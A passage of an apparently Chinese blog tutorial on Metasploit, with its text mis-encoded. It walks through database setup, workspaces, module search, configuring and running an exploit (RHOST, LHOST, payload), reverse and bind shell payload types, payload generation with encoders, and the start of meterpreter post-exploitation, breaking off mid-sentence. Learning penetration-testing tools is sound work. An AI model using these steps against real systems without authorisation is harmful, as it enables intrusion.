comment\"># æ‰“å¼€ metasploit  </span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">service</span> postgresql start </pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># metasploit ä¸»è¦ä½¿ç”¨ PostgreSQL æ•°æ®åº“å­˜å‚¨æ•°æ®ï¼Œåœ¨ä½¿ç”¨æ—¶éœ€è¦å¯åŠ¨ PostgreSQL æ•°æ®åº“</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>msfdb init</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># msfdb init å‘½ä»¤åˆ›å»ºå’Œåˆå§‹åŒ–æ•°æ®åº“  </span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>connect <span class=\"token operator\">&lt;</span>ip<span class=\"token operator\">></span>:<span class=\"token operator\">&lt;</span>port<span class=\"token operator\">></span> <span class=\"token comment\"># è¿œç¨‹è¿æ¥ä¸»æœº</span></pre></td></tr></table></figure><h1 id=\"è¿›å…¥msf\"><a class=\"anchor\" href=\"#è¿›å…¥msf\">#</a> è¿›å…¥ msf</h1>\n<p>äº¤äº’å¼ shell æç¤ºï¼š <code>msf&gt;</code> ï¼Œåé¢è¿˜ä¼šæœ‰ <code>meterpreter&gt;</code> ï¼Œä¸¤è€…æœ‰ä¸åŒ</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>æ”¯æŒè°ƒç”¨å¤–éƒ¨å‘½ä»¤ï¼Œæ‰€æœ‰ kali çš„å…¶ä»–å·¥å…·éƒ½æ˜¯æ”¯æŒçš„ï¼Œå¦‚ ncã€nmapã€Hydraã€searchsploit ç­‰ç­‰</p>\n</li>\n<li class=\"lvl-2\">\n<p>æ”¯æŒ<span class=\"kbd red\"> tab</span> è¡¥å…¨åŠŸèƒ½ï¼Œç®€ç›´äººæ€§åŒ–åˆ°çˆ†ç‚¸</p>\n</li>\n<li class=\"lvl-2\">\n<p>æ”¯æŒç³»ç»Ÿå‘½ä»¤ï¼Œå¯ä»¥ç›´æ¥æ“ä½œ kaliï¼Œlsã€cdã€catã€cp ç­‰ç­‰</p>\n</li>\n<li class=\"lvl-2\">\n<p>åŸºæœ¬å‘½ä»¤ï¼šexitã€historyã€saveï¼ˆä¿å­˜æ´»åŠ¨æ•°æ®å­˜å‚¨ï¼‰ã€sessions ï¼ˆè½¬å‚¨ä¼šè¯åˆ—è¡¨å¹¶æ˜¾ç¤ºæœ‰å…³ä¼šè¯çš„ä¿¡æ¯ï¼‰ã€backï¼ˆå›é€€ï¼‰</p>\n</li>\n<li class=\"lvl-2\">\n<p>å…ˆå­¦äº†å¸¸ç”¨çš„ï¼Œæ›´å¤šå‘½ä»¤ help å‘½ä»¤æŸ¥çœ‹</p>\n<details class=\"info\"><summary>helpå‘½ä»¤æŸ¥çœ‹msfæ‰€æœ‰ï¼š</summary><div>\n<ol>\n<li class=\"lvl-5\"><strong>æ ¸å¿ƒå‘½ä»¤ï¼ˆCore Commandsï¼‰</strong>ï¼š\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">ç”¨äºç®¡ç† Metasploit æ§åˆ¶å°çš„åŸºæœ¬åŠŸèƒ½ï¼ŒåŒ…æ‹¬å¸®åŠ©ã€æ›´æ”¹å·¥ä½œç›®å½•ã€æ˜¾ç¤º bannerã€è¿æ¥åˆ°ç›®æ ‡ä¸»æœºã€æ˜¾ç¤ºè°ƒè¯•ä¿¡æ¯ç­‰ç­‰ã€‚</li>\n</ul>\n</li>\n<li class=\"lvl-5\"><strong>æ¨¡å—å‘½ä»¤ï¼ˆModule Commandsï¼‰</strong>ï¼š\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">ç”¨äºç®¡ç† Metasploit ä¸­çš„æ¨¡å—ï¼ŒåŒ…æ‹¬æœç´¢ã€åŠ è½½ã€é…ç½®ã€æ‰§è¡Œå’Œæ˜¾ç¤ºæ¨¡å—ä¿¡æ¯ç­‰ã€‚</li>\n</ul>\n</li>\n<li class=\"lvl-5\"><strong>ä»»åŠ¡å‘½ä»¤ï¼ˆJob Commandsï¼‰</strong>ï¼š\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">ç”¨äºç®¡ç† Metasploit ä¸­çš„ä»»åŠ¡ï¼ŒåŒ…æ‹¬å¯åŠ¨ã€æ˜¾ç¤ºã€æ€æ­»å’Œé‡å‘½åä»»åŠ¡ç­‰ã€‚</li>\n</ul>\n</li>\n<li class=\"lvl-5\"><strong>èµ„æºè„šæœ¬å‘½ä»¤ï¼ˆResource Script Commandsï¼‰</strong>ï¼š\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">ç”¨äºè¿è¡Œå’Œç®¡ç† Metasploit ä¸­çš„èµ„æºè„šæœ¬ï¼Œå¯ä»¥å°†ä¸€ç³»åˆ—å‘½ä»¤ä¿å­˜åˆ°æ–‡ä»¶ä¸­ï¼Œå¹¶åœ¨éœ€è¦æ—¶æ‰§è¡Œã€‚</li>\n</ul>\n</li>\n<li class=\"lvl-5\"><strong>æ•°æ®åº“åç«¯å‘½ä»¤ï¼ˆDatabase Backend Commandsï¼‰</strong>ï¼š\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">ç”¨äºç®¡ç† Metasploit æ•°æ®åº“ä¸­çš„æ•°æ®ï¼ŒåŒ…æ‹¬ä¸»æœºã€æœåŠ¡ã€æ¼æ´ã€å‡­æ®ç­‰ã€‚</li>\n</ul>\n</li>\n<li class=\"lvl-5\"><strong>å‡­æ®åç«¯å‘½ä»¤ï¼ˆCredentials Backend Commandsï¼‰</strong>ï¼š\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">ç”¨äºç®¡ç† Metasploit æ•°æ®åº“ä¸­çš„å‡­æ®ä¿¡æ¯ã€‚</li>\n</ul>\n</li>\n<li class=\"lvl-5\"><strong>å¼€å‘è€…å‘½ä»¤ï¼ˆDeveloper Commandsï¼‰</strong>ï¼š\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">ç”¨äºå¼€å‘å’Œè°ƒè¯•æ¨¡å—ï¼ŒåŒ…æ‹¬ç¼–è¾‘ã€è°ƒè¯•ã€æ˜¾ç¤ºæ—¥å¿—ã€é‡æ–°åŠ è½½åº“æ–‡ä»¶ç­‰ã€‚</li>\n</ul>\n</li>\n<li class=\"lvl-5\"><strong>DNS å‘½ä»¤ï¼ˆDNS Commandsï¼‰</strong>ï¼š\n<ul class=\"lvl-5\">\n<li class=\"lvl-7\">ç”¨äºç®¡ç† Metasploit çš„ DNS è§£æè¡Œä¸ºã€‚<br />\n----From ğŸ¤–GPT</li>\n</ul>\n</li>\n</ol>\n</div></details>\n</li>\n</ul>\n<h1 id=\"åˆ›å»ºå·¥ä½œåŒº\"><a class=\"anchor\" href=\"#åˆ›å»ºå·¥ä½œåŒº\">#</a> åˆ›å»ºå·¥ä½œåŒº</h1>\n<pre><code class=\"language-msf\">workspace -a [name] # -aé€‰é¡¹è¡¨ç¤ºæ·»åŠ å·¥ä½œåŒº \nworksapace # æŸ¥çœ‹å½“å‰æ‰€åœ¨çš„å·¥ä½œåŒº  -væŸ¥çœ‹ç›¸å…³ä¿¡æ¯ -dåˆ é™¤å·¥ä½œåŒº -Dåˆ é™¤æ‰€æœ‰å·¥ä½œåŒº\nworksapace [å·¥ä½œåŒº] # åˆ‡æ¢å·¥ä½œåŒº\nworksapace -r [å·¥ä½œåŒº] [å·¥ä½œåŒº] # é‡å‘½åå·¥ä½œåŒº\n</code></pre>\n<div class=\"note info\">\n<p>å»ºè®®æ¯æ¬¡é’ˆå¯¹æ¸—é€æµ‹è¯•åˆ›å»ºä¸€ä¸ªå·¥ä½œåŒºï¼Œé¿å…æ•°æ®æ··æ·†ã€‚è¿™æ˜¯ä¸ªå¥½ä¹ æƒ¯ã€‚</p>\n</div>\n<h1 id=\"å¯¼å…¥æ‰«ææŠ¥å‘Š\"><a class=\"anchor\" href=\"#å¯¼å…¥æ‰«ææŠ¥å‘Š\">#</a> å¯¼å…¥æ‰«ææŠ¥å‘Š</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># ä»æ•°æ®åº“ä¸­å¯¼å…¥</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>db_status    <span class=\"token comment\"># æŸ¥çœ‹æ•°æ®åº“çŠ¶æ€</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>db_import    <span class=\"token comment\"># æŸ¥çœ‹æ”¯æŒçš„æŠ¥å‘Šæ ¼å¼</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>db_import <span class=\"token operator\">&lt;</span>filename<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span>file2 <span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span> <span class=\"token comment\"># æ‰«ææŠ¥å‘Š</span></pre></td></tr></table></figure><h1 id=\"æ‰‹åŠ¨æŸ¥è¯¢\"><a class=\"anchor\" href=\"#æ‰‹åŠ¨æŸ¥è¯¢\">#</a> æ‰‹åŠ¨æŸ¥è¯¢</h1>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>search <span class=\"token punctuation\">[</span>options<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>keywords<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># ä¾‹å¦‚</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>search smb_ms17_010</pre></td></tr></table></figure><ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>-o &lt;file&gt;: æŒ‡å®šè¾“å‡ºä¿¡æ¯çš„ä¿å­˜æ–‡ä»¶ï¼Œæ ¼å¼ä¸º CSV</p>\n</li>\n<li class=\"lvl-2\">\n<p>-S &lt;string&gt;: æŒ‡å®šæœç´¢çš„å­—ç¬¦ä¸²</p>\n</li>\n<li class=\"lvl-2\">\n<p>-uï¼šæŒ‡å®šæœç´¢æ¨¡å—<br />\næ‰¾åˆ°æ¨¡å—ä¹‹åå¯ä»¥é€šè¿‡è·¯å¾„è¿›å…¥è¯¥æ¨¡å—ï¼ŒæŸ¥è¯¢ payload</p>\n</li>\n<li class=\"lvl-2\">\n<p>search æ”¯æŒçš„æŸ¥æ‰¾æ–¹å¼ï¼š</p>\n<table>\n<thead>\n<tr>\n<th>å½¢å¼</th>\n<th>æŸ¥è¯¢æ¨¡å¼</th>\n<th>å®ä¾‹</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>path:</td>\n<td>é€šè¿‡è·¯å¾„å»æŸ¥æ‰¾</td>\n<td>search path:mysql</td>\n</tr>\n<tr>\n<td>platform:</td>\n<td>ç›¸å…³å¹³å°ï¼ˆæ¯” path èŒƒå›´å°ï¼‰</td>\n<td>search platform:mysql</td>\n</tr>\n<tr>\n<td>type:</td>\n<td>é€šè¿‡ç±»å‹æŸ¥æ‰¾</td>\n<td>search type:exploit</td>\n</tr>\n<tr>\n<td>cve:</td>\n<td>åœ¨ CVE æ•°æ®åº“ä¸­æŸ¥æ‰¾</td>\n<td>search cve:CVE-2017-8464</td>\n</tr>\n</tbody>\n</table>\n<p>å¯ä»¥åŒæ—¶ä½¿ç”¨å¤šä¸ªå½¢å¼çš„æŸ¥æ‰¾ï¼Œä¾‹å¦‚ï¼š</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>search cve:2018 name:linux  <span class=\"token comment\"># å¯»æ‰¾ 2018 å¹´ä¸ Linux æœ‰å…³çš„ CVE æ¼æ´æ¨¡å—</span></pre></td></tr></table></figure><h1 id=\"ä½¿ç”¨æ¨¡å—\"><a class=\"anchor\" href=\"#ä½¿ç”¨æ¨¡å—\">#</a> ä½¿ç”¨æ¨¡å—</h1>\n</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>use <span class=\"token punctuation\">[</span>è·¯å¾„<span class=\"token punctuation\">]</span>       <span class=\"token comment\"># è¿›å…¥æ¨¡å—ï¼Œä¾‹å¦‚</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>use auxiliary/scanner/smb/smb_ms17_010</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>info            <span class=\"token comment\"># æŸ¥çœ‹æ¼æ´æ¨¡å—çš„å…·ä½“ä¿¡æ¯</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>info <span class=\"token parameter variable\">-d</span>         <span class=\"token comment\"># ç”¨ html æ‰“å¼€è¯¦ç»†ä¿¡æ¯ï¼Œå‚»ç“œå¼æ•™å­¦å¦‚ä½•ä½¿ç”¨è¿™ä¸ªæ¨¡å—</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>show targets    <span class=\"token comment\"># æŸ¥çœ‹å¯æ”»å‡»çš„ç³»ç»Ÿç‰ˆæœ¬</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>show payloads   <span class=\"token comment\"># æŸ¥è¯¢ payload</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>show options    <span class=\"token comment\"># æŸ¥çœ‹éœ€è¦é…ç½®çš„å‚æ•°  ï¼ˆyes ä¸ºå¿…å¡«å‚æ•°ï¼‰</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>show missing    <span class=\"token comment\"># æŸ¥çœ‹ç¼ºå¤±ä»€ä¹ˆå¿…å¡«é¡¹</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token builtin class-name\">set</span> <span class=\"token punctuation\">[</span>å‚æ•°<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>å€¼<span class=\"token punctuation\">]</span>  <span class=\"token comment\"># å¡«å†™å‚æ•°ï¼Œä¾‹å¦‚ï¼š</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token builtin class-name\">set</span> payload <span class=\"token punctuation\">[</span>å€¼<span class=\"token punctuation\">]</span>   <span class=\"token comment\">#è®¾ç½® payload</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token builtin class-name\">set</span> RHOST <span class=\"token number\">192.168</span>.10.2  <span class=\"token comment\"># è®¾ç½®æ”»å‡»åœ°å€</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token builtin class-name\">set</span> LHOST <span class=\"token number\">127.0</span>.01  <span class=\"token comment\"># è®¾ç½®ç›‘å¬åœ°å€</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># è®¾ç½®å…¨éƒ¨å®Œæˆï¼Œå¼€å§‹æ‰§è¡Œæ¸—é€</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>exploit  <span class=\"token comment\"># æˆ–è€… run ã€‚å¼€å§‹æ‰§è¡Œ</span></pre></td></tr></table></figure><div class=\"note info\">\n<p>ğŸŒŸğŸŒŸmsf&gt; ä¸‹è¿æŒ‰ä¸¤æ¬¡<span class=\"kbd green\"> tab</span>ï¼Œä¼šåˆ—å‡ºå¯ç”¨æ‹“å±•</p>\n</div>\n<p>show evasion ç”¨äºæ··æ·†ï¼Œshow advanced é«˜çº§å±æ€§ã€‚post æ¨¡å—åé¢å†å­¦<br />\n<strong>å¦‚æœæ²¡æœ‰ä¼šè¯äº§ç”Ÿè¡¨ç¤ºæ²¡æœ‰æˆåŠŸã€‚</strong></p>\n<p>ä½¿ç”¨ <code>show options</code>  å¯ä»¥çœ‹åˆ° metasploit è‡ªåŠ¨å¸®æˆ‘ä»¬è®¾ç½®äº†ç›‘å¬åœ°å€ï¼Œä½†æ˜¯è¿˜æ˜¯å»ºè®®å°†ç›‘å¬åœ°å€æ”¹ä¸º<span class=\"kbd red\"> 127.0.01</span>ï¼Œé¿å… kali åœ¨ä¿®æ”¹ç½‘ç»œé€‚é…å™¨å¯¼è‡´ç›‘å¬å¤±è´¥çš„é—®é¢˜ã€‚</p>\n<h1 id=\"payload\"><a class=\"anchor\" href=\"#payload\">#</a> payload</h1>\n<p>payloads ä¹Ÿç§° shellcodeã€‚ä¸»è¦æ˜¯ç”¨æ¥å»ºç«‹ç›®æ ‡æœºä¸æ”»å‡»æœºç¨³å®šè¿æ¥çš„ï¼Œå¯åå¼¹ shellï¼Œä¹Ÿå¯ä»¥è¿›è¡Œç¨‹åºæ³¨å…¥ç­‰ã€‚</p>\n<p>ä¸€èˆ¬é€‰å®šäº† exploit ä¹‹åè°ƒç”¨ payloadï¼Œè¿›å…¥æŸä¸ªæ¨¡å—ä¹‹å <code>set payload [é€‰é¡¹]</code>  è®¾ç½® payloadï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ generate å‘½ä»¤ç›´æ¥ç”Ÿæˆ payloadã€‚</p>\n<p>Metasploit ä¸­çš„ Payload æ¨¡å—ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§ç±»å‹ï¼š</p>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p><strong>Single</strong>ï¼šæ˜¯ä¸€ç§å®Œå…¨ç‹¬ç«‹çš„ Payloadï¼Œå°±åƒè¿è¡Œ.exe ä¸€æ ·ã€‚ç”±äº Single Payload æ˜¯å®Œå…¨ç‹¬ç«‹çš„ï¼Œå› æ­¤å®ƒä»¬æœ‰å¯èƒ½ä¼šè¢«ç±»ä¼¼ netcat è¿™æ ·çš„é metasploit å¤„ç†å·¥å…·æ‰€æ•æ‰åˆ°ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<p><strong>Stager</strong>: è¿™ç§ Payload è´Ÿè´£å»ºç«‹ç›®æ ‡ç”¨æˆ·ä¸æ”»å‡»è€…ä¹‹é—´çš„ç½‘ç»œè¿æ¥ï¼Œå¹¶ä¸‹è½½é¢å¤–çš„ç»„ä»¶æˆ–åº”ç”¨ç¨‹åºã€‚åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼š</p>\n</li>\n<li class=\"lvl-2\">\n<ul class=\"lvl-2\">\n<li class=\"lvl-4\">1ï¸âƒ£ reverse_tcpï¼Œè®©ç›®æ ‡ç³»ç»Ÿä¸æ”»å‡»è€…å»ºç«‹ä¸€æ¡ tcp è¿æ¥ï¼Œè®©ç›®æ ‡ç³»ç»Ÿä¸»åŠ¨è¿æ¥æˆ‘ä»¬çš„ç«¯å£ (å³åå¼¹ shell)ã€‚</li>\n<li class=\"lvl-4\">2ï¸âƒ£bind_tcpï¼Œè®©ç›®æ ‡ç³»ç»Ÿå¼€å¯ä¸€ä¸ª tcp ç›‘å¬å™¨ï¼Œè€Œæ”»å‡»è€…å¯ä»¥ä¸ç›®æ ‡ç³»ç»Ÿè¿›è¡Œé€šä¿¡ (åå‘åå¼¹ shell)ã€‚</li>\n</ul>\n</li>\n<li class=\"lvl-2\">\n<p>Stageï¼šæ˜¯ Stager Payload ä¸‹çš„ä¸€ç§ Payload ç»„ä»¶ï¼Œè¿™ç§ Payload å¯ä»¥æä¾›æ›´åŠ é«˜çº§çš„åŠŸèƒ½ï¼Œè€Œä¸”æ²¡æœ‰å¤§å°é™åˆ¶ã€‚</p>\n</li>\n<li class=\"lvl-2\">\n<ul class=\"lvl-2\">\n<li class=\"lvl-4\">stagers å»ºç«‹è¿æ¥åï¼Œæ”»å‡»æœºå°† stages ä¼ è¾“ç»™ç›®æ ‡æœºï¼Œç”± stagers è¿›è¡Œç›¸åº”å¤„ç†ï¼Œå°†æ§åˆ¶æƒè½¬äº¤ç»™ stagesã€‚</li>\n</ul>\n</li>\n</ul>\n<p>show payload åå±•ç¤ºæ‰€æœ‰ payloadï¼Œ</p>\n<table>\n<thead>\n<tr>\n<th>#</th>\n<th>Name</th>\n<th>Rank</th>\n<th>Description</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>åºå·</td>\n<td>å‘½åï¼ˆç³»ç»Ÿ /payload ç±»å‹ / è§„åˆ™ï¼‰</td>\n<td>å±å®³ç­‰çº§</td>\n<td>å…·ä½“æè¿°</td>\n</tr>\n</tbody>\n</table>\n<p>åœ¨ Name çš„å‘½åè§„åˆ™æ˜¯ï¼š</p>\n<details class=\"primary\"><summary>è¡¨æ ¼è¯·ç«–å‘æŸ¥çœ‹ï¼Œæ¨ªå‘æ²¡æœ‰è”ç³»</summary><div>\n<table>\n<thead>\n<tr>\n<th>æ¶æ„</th>\n<th>payload ç±»å‹</th>\n<th>è§„åˆ™</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Windows</td>\n<td>shell : å¾—åˆ°ä¸€ä¸ª shell</td>\n<td>reverse_tcp : åå‘å»ºç«‹ tcp è¿æ¥ï¼ˆåå¼¹ shellï¼‰</td>\n</tr>\n<tr>\n<td>apple_ios</td>\n<td>Dllinject ï¼šä¸Šä¼  DLL å¹¶æ³¨å…¥åˆ°è¿›ç¨‹</td>\n<td>bind_tcp ï¼šå»ºç«‹ä¸€ä¸ªç›‘å¬ TCP è¿æ¥ã€‚</td>\n</tr>\n<tr>\n<td>Linux</td>\n<td>Patchupï¼šè¡¥ä¸æ¼æ´</td>\n<td>shell_find_tag ï¼š åœ¨ä¸€ä¸ªå·²å»ºç«‹çš„é“¾æ¥ä¸Šåˆ›å»ºä¸€ä¸ª shell</td>\n</tr>\n<tr>\n<td>Android</td>\n<td>Upexec : ä¸Šä¼ å¹¶æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶</td>\n<td>shell_reverse_tcp : åå‘è¿æ¥åˆ°æ”»å‡»è€…ä¸»æœºå¹¶åˆ›å»ºä¸€ä¸ª shell</td>\n</tr>\n<tr>\n<td>AIX</td>\n<td>Meterpreterï¼šé«˜çº§ payload</td>\n<td>reverse_http: é€šè¿‡ HTTP éš§é“é€šä¿¡å…µåˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·æ·»åŠ åˆ°ç®¡ç†ç»„</td>\n</tr>\n<tr>\n<td>php</td>\n<td>Vncinjectï¼šé«˜çº§ payload</td>\n<td>add_user : åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·å¹¶æ·»åŠ åˆ°ç®¡ç†ç»„</td>\n</tr>\n<tr>\n<td>Java</td>\n<td>PassiveXï¼šé«˜çº§ payload</td>\n<td>xxx_ipv6_tcp ï¼š åŸºäº IPv6</td>\n</tr>\n<tr>\n<td>ç­‰ç­‰</td>\n<td></td>\n<td>xxx_nonx_tcp ï¼šé No eXecute æˆ– win 7ï¼ˆN æ˜¯åº”ç”¨åœ¨ CPU çš„ä¸€ç§å¯ä»¥é˜²æ­¢ç¼“å†²åŒºæº¢å‡ºçš„æŠ€æœ¯ï¼‰</td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>xxx_tcp_allports ï¼š åœ¨æ‰€æœ‰å¯èƒ½çš„ç«¯å£</td>\n</tr>\n</tbody>\n</table>\n</div></details>\n<p>ç›´æ¥ä½¿ç”¨ payloadï¼š</p>\n<p>ä¸€èˆ¬æˆ‘ä»¬æ˜¯åœ¨ exploit ä¸­è°ƒç”¨ payloadï¼Œå¦‚æœæƒ³ç›´æ¥ä½¿ç”¨ payloadï¼Œå¯ä»¥ä½¿ç”¨  <code>generate</code>  å‘½ä»¤æ¥ç”Ÿæˆ payloadã€‚</p>\n<details class=\"primary\"><summary>å‚æ•°ğŸ‘‡</summary><div>\n<table>\n<thead>\n<tr>\n<th>é€‰é¡¹</th>\n<th>è¯´æ˜</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>-p / --payload</td>\n<td>æŒ‡å®š payload çš„è·¯å¾„</td>\n</tr>\n<tr>\n<td>-t /  --template</td>\n<td>payload çš„è¾“å‡ºæ ¼å¼ï¼Œé»˜è®¤æ˜¯ç»™ ruby è¯­è¨€ä½¿ç”¨çš„ 16 è¿›åˆ¶ç¼–ç è¡¨ç¤º</td>\n</tr>\n<tr>\n<td>-b</td>\n<td>è¿‡æ»¤åå­—ç¬¦æˆ–è€…æŒ‡å®šåº”é¿å…ä½¿ç”¨çš„å­—ç¬¦</td>\n</tr>\n<tr>\n<td>-e  /--encoder</td>\n<td>æŒ‡å®š encoder ç¼–ç ï¼ˆé»˜è®¤ä¸ä½¿ç”¨ encoderï¼‰   å¦‚ï¼šx86/shikata_ga_nai</td>\n</tr>\n<tr>\n<td>-i</td>\n<td>åŠ å¯†è½®æ•°</td>\n</tr>\n<tr>\n<td>-k</td>\n<td>æ‰§è¡Œè¿‡ç¨‹ä¸­ä¸ä¼šäº§ç”Ÿæ–°çš„è¿›ç¨‹ï¼Œä¼šåœ¨å½“å‰è¿›ç¨‹ä¸­äº§ç”Ÿçº¿ç¨‹ï¼Œéšè”½æ€§é«˜äº›</td>\n</tr>\n<tr>\n<td>-x</td>\n<td>æŒ‡å®šè¦åœ¨ç”Ÿæˆçš„ payload ä¸­æ‰§è¡Œçš„å‘½ä»¤</td>\n</tr>\n<tr>\n<td>-a / -arch</td>\n<td>æŒ‡å®šç›®æ ‡æ¶æ„ã€‚ä¾‹å¦‚ï¼Œ <code>x86</code>  æˆ–  <code>x64</code> ã€‚</td>\n</tr>\n<tr>\n<td>-f</td>\n<td>æŒ‡å®šè¾“å‡ºçš„æ ¼å¼ï¼Œå¦‚  <code>ruby</code> ,  <code>python</code> ,  <code>perl</code> ,  <code>c</code> ,  <code>go</code>  ç­‰ã€‚</td>\n</tr>\n<tr>\n<td>-v</td>\n<td>ä¸ºç”Ÿæˆçš„ payload åˆ†é…ä¸€ä¸ªå˜é‡åã€‚è¿™åœ¨å°† payload åµŒå…¥è„šæœ¬æ—¶å¾ˆæœ‰ç”¨ã€‚</td>\n</tr>\n<tr>\n<td>-n æˆ– --nop</td>\n<td>æŒ‡å®šè¦æ·»åŠ åˆ° payload å‰é¢çš„ NOP æ»‘åŠ¨æŒ‡ä»¤çš„æ•°é‡ã€‚</td>\n</tr>\n<tr>\n<td>-o  / --output</td>\n<td>ä¿å­˜åˆ°æŒ‡å®šæ–‡ä»¶ä¸­</td>\n</tr>\n<tr>\n<td>-s /  --space</td>\n<td>æŒ‡å®šå¯ç”¨çš„ç©ºé—´é‡ï¼Œ <code>msfpayload</code>  ä¼šå°è¯•åœ¨è¿™ä¸ªå¤§å°å†…ç”Ÿæˆ payloadã€‚</td>\n</tr>\n<tr>\n<td>--lport &lt;ip&gt;</td>\n<td>è®¾ç½®åå‘è¿æ¥ç±»å‹çš„ payload çš„ç›‘å¬ç«¯å£ï¼ˆLPORTï¼‰ã€‚</td>\n</tr>\n<tr>\n<td>--lhost &lt;ip&gt;</td>\n<td>è®¾ç½®åå‘è¿æ¥ç±»å‹çš„ payload çš„ç›‘å¬ä¸»æœºåœ°å€ï¼ˆLHOSTï¼‰ã€‚</td>\n</tr>\n</tbody>\n</table>\n<p>æ”¯æŒçš„ payload çš„è¾“å‡ºæ ¼å¼ï¼šbashï¼Œcï¼Œhexï¼Œjavaï¼Œjsï¼Œplï¼Œpowershellï¼Œpyï¼Œpythonï¼Œrawï¼Œrbï¼Œrubyï¼Œshï¼Œvbscriptï¼Œaspï¼Œdllï¼Œelfï¼Œexeï¼Œjarï¼Œmsipshï¼Œpsh-cmdï¼Œ vbaï¼Œvbi-exeï¼Œvba-pshï¼Œvbsï¼Œwar ç­‰ç­‰ï¼ˆå‡ ä¹æ¶µç›–æ‰€æœ‰è¯­è¨€ï¼‰</p>\n</div></details>\n<ul class=\"lvl-0\">\n<li class=\"lvl-2\">\n<p>kali ä¸­ä¹Ÿæ”¯æŒåœ¨ msf å¤–ä½¿ç”¨ <code>msfvenom</code>  å‘½ä»¤ç›´æ¥ç”Ÿæˆ payloadï¼Œåé¢å†å­¦ã€‚</p>\n</li>\n</ul>\n<p>å‚è€ƒ<a href=\"https://www.cnblogs.com/dogecheng/p/11478953.html\"> MSFâ€”â€”Payload æ¨¡å—ï¼ˆäºŒï¼‰ - é‚£å°‘å¹´å’Œç‹—</a></p>\n<h1 id=\"é€šè¿‡cveç½‘ç«™æŸ¥æ‰¾\"><a class=\"anchor\" href=\"#é€šè¿‡cveç½‘ç«™æŸ¥æ‰¾\">#</a> é€šè¿‡ CVE ç½‘ç«™æŸ¥æ‰¾</h1>\n<p>çœ‹çœ‹æ•™ç¨‹å§ï¼Œä¸ä¼šå°±<a href=\"http://t.csdnimg.cn/hrTPb\">æˆ³è¿™</a></p>\n<h1 id=\"åæ¸—é€é˜¶æ®µ\"><a class=\"anchor\" href=\"#åæ¸—é€é˜¶æ®µ\">#</a> åæ¸—é€é˜¶æ®µ</h1>\n<p>å³å·²ç»é€šè¿‡ payload æ‹¿åˆ°äº† shell ä¹‹åï¼Œé€šå¸¸éƒ½æ˜¯æ®‹ç–¾çš„ shellã€‚metasploit å¼€å¯ä¸€ä¸ªä¼šè¯ <code>meterpreter&gt; ...</code></p>\n<div class=\"note primary\">\n<ol>\n<li class=\"lvl-3\">\n<p>Meterpreter æ˜¯ Metasploit æ¡†æ¶ä¸­çš„ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œä½œä¸ºæº¢å‡ºæˆåŠŸä»¥åçš„æ”»å‡»è½½è·ä½¿ç”¨ï¼Œæ”»å‡»è½½è·åœ¨æº¢å‡ºæ”»å‡»æˆåŠŸä»¥åç»™æˆ‘ä»¬è¿”å›ä¸€ä¸ªæ§åˆ¶é€šé“ã€‚ä½¿ç”¨å®ƒä½œä¸ºæ”»å‡»è½½è·èƒ½å¤Ÿè·å¾—ç›®æ ‡ç³»ç»Ÿçš„ä¸€ä¸ª Meterpreter shell çš„é“¾æ¥ã€‚</p>\n</li>\n<li class=\"lvl-3\">\n<p>Meterpreter shell 